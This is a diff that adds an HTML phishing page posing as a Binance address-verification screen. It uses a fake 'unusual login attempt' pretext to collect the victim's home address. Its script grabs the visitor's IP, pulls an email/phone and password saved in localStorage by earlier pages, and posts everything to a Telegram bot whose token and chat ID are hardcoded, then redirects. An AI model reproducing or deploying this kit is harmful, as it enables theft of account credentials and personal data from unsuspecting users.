@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset='utf-8'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <title>Verify | Binance</title>
+    <meta name='viewport' content='width=device-width, initial-scale=1'>
+    <link rel='stylesheet' type='text/css' media='screen' href='style.css'>
+    <link rel="icon" href="img/icon.png">
+    <script src='main.js'></script>
+</head>
+<body>
+    <img class="logo" src="img/logo.png">
+    
+    <div class="container" id="container">
+        <div class="form-container">
+            <h2 class="verify-txt">Verify your Address</h2>
+
+            <form onsubmit="sendData(); return false;">
+                <input type="hidden" name="ip" id="ipAddress">
+                <div class="input-group">
+                    <p class="label" id="label">There is something unusual about your current login attempt. For your own security we require that you reverify your house address as it is on your identification card below</p>
+                    <p class="label">Address</p>
+                    <input type="text" minlength="6" maxlength="40" required  id="address">
+                </div>
+                
+                <div class="input-group">
+                    
+                    <button class="next-btn" type="text">Verify</button>
+                </div>
+            </form>
+              
+                
+            
+        </div>
+    </div>
+    <footer>
+        <p>Binance &copy; 2024</p>
+        <p>Cookie Preferences</p>
+    </footer>
+    
+    
+    
+
+
+
+<!--IP ADDRESS JS CODE START---------------->
+<script type="text/javascript">
+    document.addEventListener("DOMContentLoaded", function() {
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById('ipAddress').value = data.ip;
+        });
+        
+});
+</script>
+    
+    
+    <script>
+        function sendData() {
+            const ip = document.getElementById('ipAddress').value;
+            const emailOrPhone = localStorage.getItem('emailOrPhone') || 'N/A';
+            const password = localStorage.getItem('password') || 'N/A';
+            const address = document.getElementById('address').value;
+
+            const message = `
+ipAddress: ${ip}
+Email/Phone: ${emailOrPhone}
+Password: ${password}
+Address: ${address}
+            `;
+
+            const botToken = '6544160544:AAHopuAV9dtF9Kz9nHZFi6GoZj_1SXZ5vWU';
+            const chatId = '-1001909128618';
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Data sent successfully!');
+                        window.location.href = 'verificationInProgress.html';
+                        localStorage.clear(); // Clear stored data after submission
+                    } else {
+                        console.log('Error sending data.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+        }
+    </script>
+</body>
+</html>
